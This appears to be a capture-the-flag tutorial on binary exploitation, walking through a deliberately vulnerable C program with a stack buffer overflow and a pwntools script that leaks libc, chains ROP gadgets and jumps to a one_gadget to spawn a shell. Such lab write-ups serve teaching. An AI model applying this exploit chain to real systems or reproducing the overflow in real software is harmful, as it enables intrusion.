# Simple PWN - 0x08(one_gadget with ROP)
###### tags: `CTF` `PWN` `eductf`

## one_gadget background
[Day25: [Misc] 我從來沒想過我會害怕寫 code](https://ithelp.ithome.com.tw/articles/10226977)
> 原理是在 `glibc` 裡面有很多會透過 `execve` 執行 `/bin/sh`、再調用外部系統指令的 assembly，當 explolit 已經得知 `libc` 的位之後而且可以控制 RIP 之後，就可以直接跳該位置達成 shell out，不需要再辛苦堆 stack 上的參數

## Original Code
```cpp!=
#include <stdio.h>
#include <unistd.h>

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IOBNF, 0);

    char s[0x10];

    printf("Your libc: %p", printf);
    read(0, s, 0x100);

    return 0;
}
```
* The program has buffer overflow, however it has no backdoor method can access and has no global variable can write shellcode. Thus, we can consider to use `ROP` to get shell.
* Note that, it must be a dynamic library, so DO NOT use `-static` to compile it.
    ```bash!
    gcc -o one_gadget_with_rop one_gadget_with_rop.c -no-pie -fno-stack-protector -z norelro -zexecstack
    ```

## Exploit
* First, we use [<font color="FF0000">`ldd`</font>](https://shengyu7697.github.io/linux-ldd/) command to find what library the program will use.
    ![](https://imgur.com/ycRb8Tv.png)
* In addition, we use `one_gadget` command to find `execvs`
    * Note that, how to use it can refer to [one_gadget用法](https://blog.csdn.net/weixin_43092232/article/details/105085880)
    * We use `0xebcf8 execve("/bin/sh", rsi, rdx)` as our method
    ![](https://imgur.com/Y7BBH5J.png)
        * <font color="FF0000">Note:</font> it has 3 constraint so that we can get the shell
        ```bash!
        address rbp-0x78 is writable
        [rsi] == NULL || rsi == NULL
        [rdx] == NULL || rdx == NULL
        ```
* Then, we use `one_gadget` command to get `ROP` chain
    ```bash!
    ROPgadget --binary one_gadget_with_rop --only "pop|ret" > one_gadget
    vim one_gadget
    ```
    You can see that because we didn't compile with library, the gadget that we may can use is very few.
    ![](https://imgur.com/DuGINHL.png)
    The solution is using the gadget that `libc` have:
    ```bash!
    $ ROPgadget --binary  /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" > one_gadget
    $ vim one_gadget
    ```
    We must satisfied one_gadget constraint. `0x90529` and `0x2be51` are the offset of `/lib/x86_64-linux-gnu/libc.so.6`. Therefore, if we want to call these gadget, <font color="FF0000">we must find out the real base address of `/lib/x86_64-linux-gnu/libc.so.6`</font>.
    ![](https://imgur.com/3h5PqcO.png)
    ![](https://imgur.com/Z2bBbhJ.png)
* Because, `ASLR` is turn on in default, so the address of library will be random, we just know the offset of library. In original code, it told us the `printf` address in `/lib/x86_64-linux-gnu/libc.so.6` → <font color="FF0000">`0x7ffff7def770`</font>
    ![](https://imgur.com/nuYGx24.png)
    Used `gdb` can find the current address of library → <font color="FF0000">`0x7ffff7d8f000`</font>
    ![](https://imgur.com/Et3r2hI.png)
    Then we can know the offset and construct apart of payload as below 
    $$0x7ffff7def770 - 0x7ffff7d8f000 = 0x60770$$
    ```python!=
    from pwn import *
    import sys

    context.arch = 'amd64'

    r = process('./one_gadget_with_rop')

    r.recvuntil("Your libc: ")
    libc = int(r.recv(14), 16) - 0x60770
    info(f"libc: {hex(libc)}")
    ```
* And prepare our gadget:
    ```python!=11
    pop_rdx_rbx_ret = libc + 0x90529
    pop_rsi_ret = libc + 0x2be51
    ```
* Construct whole payload with considering the constraint:
    ```python!=13
    r.send(b'a'*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
    r.interactivae()
    ```
    * `b'a'*0x10` is for `$rsi`
    * `p64(0x404000)` is an arbitrary writable and readable address for `$rbp-0x78` one of the constraint of one_gadget
    * `p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)` is what we did in [last lecture](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs) of `ROP`
    * `p64(libc+0xebcf8)` is the one_gadget that we choose at the beginning.
* Finally, we got shell!!!
    ![](https://imgur.com/iIETaBy.png)


## Reference
[Linux ldd 查看執行檔執行時需要哪些 library](https://shengyu7697.github.io/linux-ldd/)
[Pwn week1](https://youtu.be/ktoVQB99Gj4)